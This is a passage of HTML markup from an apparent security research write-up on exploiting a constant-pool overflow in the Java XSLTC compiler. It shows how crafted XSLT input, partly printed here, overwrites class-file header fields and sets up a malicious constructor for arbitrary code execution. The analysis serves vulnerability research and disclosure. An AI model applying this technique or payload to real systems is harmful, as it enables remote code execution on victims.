font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xXX 0xXX</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x00</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: #9900ff; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0x00 0x00</span><span style="background-color: #fce5cd; color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: #fce5cd; color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 14pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">0xZZ 0xZZ</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="color: #38761d; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flags&nbsp; </span><span style="color: red; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">this_class</span><span style="color: #38761d; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> &nbsp; </span><span style="color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">super_class&nbsp; </span><span style="color: #4a86e8; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ints_count</span><span style="color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp; </span><span style="color: #9900ff; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">fields_count</span><span style="color: #ff9900; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="color: magenta; font-family: &quot;Roboto Mono&quot;, monospace; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">methods_count</span></p><br /><ol style="margin-bottom: 0; margin-top: 0; padding-inline-start: 48px;"><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">We craft a XSLT input that results in 0x10703 constants in the pool. This will result in a truncated pool size of 0x703 and the start of the constant at index 0x703 (due to 0 based indexing) will be interpreted as </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">access_flags</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">.</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">During compilation of the input, we trigger the addition of a new string constant when the pool has 0x702 constants. This will first create a CONSTANT_Utf8 entry at index 0x702 and a CONSTANT_String entry at 0x703. The String entry will reference the preceding Utf8 constant so its value will be the tag byte 0x08 followed by the index 0x07 0x02. This results in an usable access_flags value of 0x0807.&nbsp;</span></p></li><li aria-level="1" dir="ltr" style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; list-style-type: decimal; vertical-align: baseline; white-space: pre;"><p dir="ltr" role="presentation" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Add a CONSTANT_Double entry at index 0x704. Its 0x06 tag byte will be interpreted as part of the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">this_class</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> field. The following 2 bytes can then be used to control the value of the </span><span style="color: #0d904f; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">super_class</span><span style="font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> field. By setting the next 4 bytes to 0x00, we create an empty interface and fields arrays, before setting the last two bytes to the number of methods we want to define.&nbsp;</span></p></li></ol><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The only remaining requirement is that we need to add a CONSTANT_Class entry at index 0x206 of the constant pool, which is relatively straightforward.&nbsp;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">The snippet below shows part of the generated XSLT input that will overwrite the first header fields. After filling the constant pool with a large number of string constants for the attribute fields and values, the CONST_STRING entry for the `jEb` element ends up at index 0x703. The XSLT function call to the `ceiling` function then triggers the addition of a controlled CONST_DOUBLE entry at index 0x704:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;jse jsf='jsg'  jDL</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDM'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDN</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDO'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDP</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDQ'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDR</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDS'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDT</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDU'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDV</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDW'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDX</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jDY'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> jDZ</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'jEa'</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">&lt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">jEb </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&lt;</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">xsl</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">:</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">value</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">-</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">of </span><span style="background-color: transparent; color: #9c27b0; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">select</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">=</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">'ceiling(</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; font-weight: 700; vertical-align: baseline; white-space: pre-wrap;">0.000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000008344026969402015</span><span style="background-color: transparent; color: #0f9d58; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">)'</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">/&gt;</span></p></td></tr></tbody></table></div><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="font-family: Arial; font-size: 11pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">We constructed the initial header fields and are now in the interesting part of the class file definition: The methods table. This is where all methods of a class and their bytecode is defined. After XSLTC generates a Java class, the XSLT runtime will load the class and instantiate an object, so the easiest way to achieve arbitrary code execution is to create a malicious constructor. Lets take a look at the methods table to see how we can define a working constructor:</span></p><br /><div align="left" dir="ltr" style="margin-left: 0pt;"><table style="border-collapse: collapse; border: none;"><colgroup></colgroup><tbody><tr style="height: 0pt;"><td style="background-color: #fafafa; border-bottom: solid #e0e0e0 1pt; border-left: solid #e0e0e0 1pt; border-right: solid #e0e0e0 1pt; border-top: solid #e0e0e0 1pt; overflow-wrap: break-word; overflow: hidden; padding: 5pt 5pt 5pt 5pt; vertical-align: top;"><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">ClassFile</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; methods_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;method_info&nbsp; &nbsp; methods</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">methods_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;[...]</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">method_info </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; access_flags</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; name_index</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; descriptor_index</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; attributes_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;attribute_info attributes</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attributes_count</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attribute_info </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 attribute_name_index</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 attribute_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 info</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">[</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">attribute_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">];</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">}</span></p><br /><br /><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; color: #3367d6; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">Code_attribute</span><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;"> </span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">{</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 attribute_name_index</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 attribute_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 max_stack</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u2 max_locals</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u4 code_length</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">;</span></p><p dir="ltr" style="line-height: 1.38; margin-bottom: 0pt; margin-top: 0pt;"><span style="background-color: transparent; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; font-variant-numeric: normal; vertical-align: baseline; white-space: pre-wrap;">&nbsp;&nbsp;&nbsp;&nbsp;u1 code</span><span style="background-color: transparent; color: #616161; font-family: Courier New, sans-serif; font-size: 10pt; font-variant-east-asian: normal; 